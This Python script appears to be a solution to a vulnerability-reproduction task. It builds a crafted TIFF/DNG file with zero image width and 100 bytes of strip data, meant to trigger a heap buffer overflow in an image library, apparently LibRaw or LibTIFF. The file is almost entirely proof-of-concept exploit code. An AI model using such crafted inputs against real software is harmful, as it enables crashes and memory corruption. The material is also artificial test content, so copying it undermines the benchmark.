import struct

class Solution:
    def solve(self, src_path: str) -> bytes:
        """
        Generate a PoC that triggers the vulnerability.
        
        The vulnerability corresponds to a heap buffer overflow due to zero width or height
        images not being checked properly in an image parsing library (likely LibRaw or LibTIFF).
        
        We construct a minimal TIFF (DNG) file with ImageWidth set to 0. This typically
        causes a buffer allocation of size 0 (or a small undersized buffer), which is then
        overflowed when the library attempts to read the image data based on strip sizes 
        or other parameters.
        """
        
        # TIFF Header: Little Endian 'II', Version 42, Offset to first IFD 8
        endianness = b'II'
        version = 42
        ifd_offset = 8
        header = struct.pack('<2sHI', endianness, version, ifd_offset)
        
        entries = []
        
        def add_entry(tag, type_, count, value):
            entries.append((tag, type_, count, value))
            
        # TIFF Tags
        # 254 (0xFE) NewSubfileType: 0 (Full resolution)
        add_entry(254, 4, 1, 0)
        
        # 256 (0x100) ImageWidth: 0  <-- TRIGGER
        # Setting width to 0 often leads to 0-byte allocation for the image buffer
        add_entry(256, 3, 1, 0)
        
        # 257 (0x101) ImageLength: 10
        # Valid height to ensure loops are entered
        add_entry(257, 3, 1, 10)
        
        # 258 (0x102) BitsPerSample: 8
        add_entry(258, 3, 1, 8)
        
        # 259 (0x103) Compression: 1 (None)
        add_entry(259, 3, 1, 1)
        
        # 262 (0x106) PhotometricInterpretation: 1 (BlackIsZero)
        add_entry(262, 3, 1, 1)
        
        # 273 (0x111) StripOffsets: Placeholder, calculated later
        add_entry(273, 4, 1, 0)
        
        # 277 (0x115) SamplesPerPixel: 1
        add_entry(277, 3, 1, 1)
        
        # 278 (0x116) RowsPerStrip: 10
        add_entry(278, 3, 1, 10)
        
        # 279 (0x117) StripByteCounts: 100
        # Specifies 100 bytes of data to be read, which will overflow the 0-sized buffer
        add_entry(279, 4, 1, 100)
        
        # 50706 (0xC612) DNGVersion: 1.4.0.0
        # Helps identify as DNG/RAW if the target is LibRaw
        # Type 1 (BYTE), Count 4. Value 1, 4, 0, 0 packed into 4 bytes LE
        add_entry(50706, 1, 4, 0x00000401)
        
        # Sort entries by Tag ID
        entries.sort(key=lambda x: x[0])
        
        # Calculate offsets
        num_entries = len(entries)
        # IFD Size: Count(2) + Entries(12 * N) + NextIFD(4)
        ifd_size = 2 + (12 * num_entries) + 4
        
        # Data follows Header (8 bytes) + IFD
        data_offset = 8 + ifd_size
        
        # Construct IFD
        ifd_bytes = bytearray()
        ifd_bytes.extend(struct.pack('<H', num_entries))
        
        for tag, typ, cnt, val in entries:
            if tag == 273:
                val = data_offset
            # Pack entry: Tag(2), Type(2), Count(4), Value(4)
            ifd_bytes.extend(struct.pack('<HHII', tag, typ, cnt, val))
            
        ifd_bytes.extend(struct.pack('<I', 0)) # Next IFD Offset (0)
        
        # Image Data (100 bytes of junk)
        image_data = b'\xAA' * 100
        
        return header + ifd_bytes + image_data
